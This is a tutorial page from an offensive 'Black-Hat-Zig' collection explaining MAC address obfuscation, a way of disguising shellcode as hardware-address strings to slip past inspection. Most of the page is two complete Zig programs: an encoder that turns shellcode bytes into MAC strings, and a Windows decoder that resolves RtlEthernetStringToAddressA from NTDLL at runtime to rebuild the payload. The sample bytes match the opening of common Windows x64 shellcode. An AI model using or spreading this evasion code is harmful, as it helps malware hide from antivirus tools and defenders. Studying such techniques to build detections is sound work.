# MAC Address Obfuscation

## TL;DR

[See the code example](https://github.com/CX330Blake/Black-Hat-Zig/tree/main/src/Payload-Obfuscation/MAC-Address-Obfuscation)

## Explanation

MAC address obfuscation converts shellcode into strings formatted like hardware
MAC addresses (e.g., `AA-BB-CC-DD-EE-FF`). Because such strings are common in
network configuration data, they may not raise suspicion when stored or
transmitted. The program later splits these strings, converts the hexadecimal
pairs back into bytes, and concatenates them into the original payload. While
simple, this technique effectively hides binary code from direct inspection.

## Obfuscation

```zig title="main.zig"
const std = @import("std");

/// Generates a MAC address string from 6 raw bytes
fn generateMAC(a: u8, b: u8, c: u8, d: u8, e: u8, f: u8, buffer: []u8) []const u8 {
    // Format the 6 bytes as a MAC address string (XX-XX-XX-XX-XX-XX)
    return std.fmt.bufPrint(buffer, "{X:0>2}-{X:0>2}-{X:0>2}-{X:0>2}-{X:0>2}-{X:0>2}", .{
        a, b, c, d, e, f,
    }) catch unreachable;
}

/// Generate the MAC output representation of the shellcode
fn generateMacOutput(pShellcode: []const u8, writer: anytype) !bool {
    const shellcodeSize = pShellcode.len;

    // If the shellcode buffer is empty or the size is not a multiple of 6, exit
    if (shellcodeSize == 0 or shellcodeSize % 6 != 0) {
        return false;
    }

    try writer.print("const mac_array = [_][*:0]const u8{{\n\t", .{});

    // Buffer to hold the MAC address string (XX-XX-XX-XX-XX-XX = 17 chars + null)
    var macBuffer: [32]u8 = undefined;

    var counter: usize = 0;

    // Process the shellcode in groups of 6 bytes
    var i: usize = 0;
    while (i < shellcodeSize) {
        // Generate a MAC address from the current 6 bytes
        const mac = generateMAC(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3], pShellcode[i + 4], pShellcode[i + 5], &macBuffer);

        counter += 1;

        // Print the MAC address
        if (i == shellcodeSize - 6) {
            // Last MAC address
            try writer.print("\"{s}\"", .{mac});
        } else {
            // Not the last one, add comma
            try writer.print("\"{s}\", ", .{mac});
        }

        // Move to the next group of 6 bytes
        i += 6;

        // Add a newline for formatting after every 6 MAC addresses
        if (counter % 6 == 0 and i < shellcodeSize) {
            try writer.print("\n\t", .{});
        }
    }

    try writer.print("\n}};\n\n", .{});
    return true;
}

pub fn main() !void {
    // Example shellcode (must be a multiple of 6 bytes)
    const shellcode = [_]u8{
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, // 1st MAC
        0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, // 2nd MAC
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, // 3rd MAC
        0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, // 4th MAC
        0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, // 5th MAC
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, // 6th MAC
        0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, // 7th MAC
    };

    // Use stdout as the writer
    const stdout = std.io.getStdOut().writer();

    std.debug.print("[+] Generating MAC address representation for {} bytes of shellcode\n", .{shellcode.len});

    // Generate and print the MAC address representation
    if (try generateMacOutput(&shellcode, stdout)) {} else {
        std.debug.print("[!] Failed to generate MAC address representation\n", .{});
    }
}
```

## Deobfuscation

```zig title="main.zig"
const std = @import("std");
const win = std.os.windows;
const kernel32 = win.kernel32;

const NTSTATUS = win.NTSTATUS;
const PCSTR = [*:0]const u8;
const PVOID = ?*anyopaque;
const PBYTE = [*]u8;
const SIZE_T = usize;

// Define function pointer type for RtlEthernetStringToAddressA
const fnRtlEthernetStringToAddressA = fn (
    S: PCSTR,
    Terminator: *PCSTR,
    Addr: PVOID,
) callconv(win.WINAPI) NTSTATUS;

/// Deobfuscates an array of MAC addresses into a byte buffer
pub fn macDeobfuscation(
    macArray: []const [*:0]const u8,
    allocator: std.mem.Allocator,
) !struct { buffer: []u8, size: SIZE_T } {
    // Create a UTF-16 string for "NTDLL"
    const ntdll_w: [*:0]const u16 = std.unicode.utf8ToUtf16LeStringLiteral("NTDLL");

    // Load the NTDLL library using wide string
    const ntdll_module = kernel32.GetModuleHandleW(ntdll_w);
    if (ntdll_module == null) {
        std.debug.print("[!] GetModuleHandle Failed With Error : {}\n", .{kernel32.GetLastError()});
        return error.GetModuleHandleFailed;
    }

    // Get the address of RtlEthernetStringToAddressA function
    const rtlEthernetStringToAddressA_ptr = kernel32.GetProcAddress(ntdll_module.?, "RtlEthernetStringToAddressA");
    if (rtlEthernetStringToAddressA_ptr == null) {
        std.debug.print("[!] GetProcAddress Failed With Error : {}\n", .{kernel32.GetLastError()});
        return error.GetProcAddressFailed;
    }

    // Cast the function pointer to the correct type
    const rtlEthernetStringToAddressA: *const fnRtlEthernetStringToAddressA = @ptrCast(rtlEthernetStringToAddressA_ptr);

    // Calculate the size of the buffer needed (number of MAC addresses * 6 bytes each)
    const bufferSize = macArray.len * 6; // MAC addresses are 6 bytes each

    // Allocate memory for the deobfuscated shellcode
    const buffer = try allocator.alloc(u8, bufferSize);
    errdefer allocator.free(buffer);

    // Using a raw pointer to keep track of our current position
    var tmpBuffer: [*]u8 = buffer.ptr;

    // Deobfuscate each MAC address
    for (macArray) |macAddress| {
        var terminator: PCSTR = undefined;

        // Convert the MAC address string to bytes
        const status = rtlEthernetStringToAddressA(macAddress, &terminator, tmpBuffer);

        // Check if the status is not SUCCESS (0)
        if (status != NTSTATUS.SUCCESS) {
            std.debug.print("[!] RtlEthernetStringToAddressA Failed At [{s}] With Error 0x{X:0>8}\n", .{ macAddress, @intFromEnum(status) });
            return error.RtlEthernetStringToAddressFailed;
        }

        // Increment tmpBuffer by 6 bytes for the next address
        tmpBuffer = @as([*]u8, @ptrFromInt(@intFromPtr(tmpBuffer) + 6));
    }

    return .{ .buffer = buffer, .size = bufferSize };
}

pub fn main() !void {
    // Setup allocator
    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);
    defer arena.deinit();
    const allocator = arena.allocator();

    // Example array of MAC addresses (shellcode encoded as MAC)
    const mac_array = [_][*:0]const u8{ "FC-48-83-E4-F0-E8", "C0-00-00-00-41-51", "41-50-52-51-56-48", "31-D2-65-48-8B-52", "60-48-8B-52-18-48", "8B-52-20-48-8B-72", "50-48-0F-B7-4A-4A" };
    std.debug.print("[+] Attempting to deobfuscate {} MAC addresses\n", .{mac_array.len});

    // Call the deobfuscation function
    const result = try macDeobfuscation(&mac_array, allocator);
    defer allocator.free(result.buffer);

    std.debug.print("[+] Successfully deobfuscated shellcode\n", .{});
    std.debug.print("[+] Buffer size: {} bytes\n", .{result.size});

    // Print all bytes
    std.debug.print("[+] Deobfuscated bytes: ", .{});
    for (result.buffer) |byte| {
        std.debug.print("{X:0>2} ", .{byte});
    }
    std.debug.print("\n", .{});
}
```
